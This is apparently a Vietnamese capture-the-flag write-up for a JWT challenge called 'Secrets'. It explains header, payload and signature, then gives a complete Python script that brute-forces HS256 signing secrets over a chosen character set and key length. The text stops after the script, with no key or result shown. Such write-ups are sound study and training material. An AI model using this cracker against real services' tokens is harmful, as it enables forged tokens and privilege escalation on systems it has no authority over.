# CookieArenaS2Writeup
Challenge: Secrets

"You’re a senior cyber security engineer and during your shift, we have intercepted/noticed a high privilege actions from unknown source that could be identified as malicious. We have got you the ticket that made these actions.
You are the one who created the secret for these tickets.
Please fix this and submit the low privilege ticket so we can make sure that you deserve this position."

Được rồi, như đề bài ta có thể tóm gọn lại câu chuyện như sau: bản thân là một senior cybersec engineer, và trong 1 lần làm việc thì họ đã phát hiện ra một cuộc tấn công leo thang đặc quyền cao, ticket đã bị sửa đổi bởi hacker với mục đích xấu và tất cả những gì chúng ta phải làm là đưa ticket trở lại bình thường và submit low privilege ticket và secret key 

Trước hết, ta có thể dễ dàng xác định đây là JWT Token, với cấu trúc cơ bản là: **header - payload - signature** mỗi một phần được mã hóa bằng base64 và trong challenge này phần signature sẽ là phần ta cần chú ý nhiều nhất.

Vậy vấn đề thật sự là gì, khi JWT Token được gửi lên server, nếu muốn thay đổi dữ liệu nào đó một cách hợp lệ thì ở phía client cần signing lại token trước khi gửi lên server và sẽ được server chấp thuận nếu như secret key ở cả hai bên giống nhau => ta cần phải tìm ra secret key sao cho trùng khớp với key ở phía server

Độ dài của secret key tối đa là 256 bits (32 bytes) nên ta hoàn toàn có thể yên tâm ngồi brute force đến khi nào ra key thì thôi :> 

Nếu các bạn không brute ra được key bằng các công cụ bình thường thì cũng đừng bất ngờ, vì bài mức hard mà, đâu dễ dàng gì đúng không nào, vì chúng ta đều biết rằng những vụ tấn công liên quan đến JWT Token là thiên biến vạn hóa, secret key cũng có thể nằm trong các wordlist có sẵn nhưng cũng có thể không nằm trong bất cứ wordlist nào. Do đó tự tạo script để giải quyết các vấn đề luôn là cách hữu hiệu và đầy mạnh mẽ.
  
Ở đây ta sẽ tạo 1 script nho nhỏ bằng python để brute force ra key:
```#!/usr/bin/env python3
#Usage is as follows: ./jwtbrute.py MyJWTToken [keyspace] [min key length] [max key length] [-s for silent]
import jwt
import sys
from itertools import chain, product
found = False
attempts = 0
#Command line arguments: 0 = program, 1 = Token, 2 = Alphabet, 3 = minLength, 4 = MaxLength
pArgs = sys.argv
if len(pArgs) < 2:
    sys.exit("Incorrect syntax; try: ./jwtbrute.py MyJWTToken [keyspace] [min key length] [max key length] [-s for silent]")
myToken = pArgs[1] #your JWT token.
if len(pArgs) >= 3:
    myAlpha = pArgs[2] #keyspace - default is full upper and lower case, plus numbers, plus special characters
else:
    myAlpha = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&*()_-+"
if len(pArgs) >= 4:
    minLength = int(pArgs[3]) #min length of guess, default is 1
else:
    minLength = 1
if len(pArgs) >= 5:
    maxLength = int(pArgs[4]) #max length of guess, default is 4
else:
    maxLength = 4

if len(pArgs) >= 6 and pArgs[5] == "-s":
    silent = True
else:
    silent = False
if int(maxLength) < int(minLength):
    sys.exit("Error: Max key length cannot be less than min key length.")

def brute(charset, keylength, keymin):
    return (''.join(candidate)
        for candidate in chain.from_iterable(product(charset, repeat=i)
        for i in range(keymin, keylength + 1)))

for keyl in brute(myAlpha, maxLength, minLength):
    attempts += 1
    try:
        jwt.decode(myToken, keyl, algorithms=["HS256"])
        sys.stdout.write("Key Found! %s\n" % (keyl))
        sys.stdout.flush()
        found = True
    except jwt.exceptions.InvalidSignatureError:
        pass

    #-s for silent mode will hide these messages
    if silent == False:
        if attempts % 1000 == 0:
            sys.stdout.write("Currently on attempt %s\n" % (attempts))
            sys.stdout.write("Current Guess: %s\n" % (keyl))

    if found == True:
        sys.exit("Key found in %s attempts." % (attempts))

if found == False:
    sys.exit("Key not found after %s attempts." % (attempts))```
  
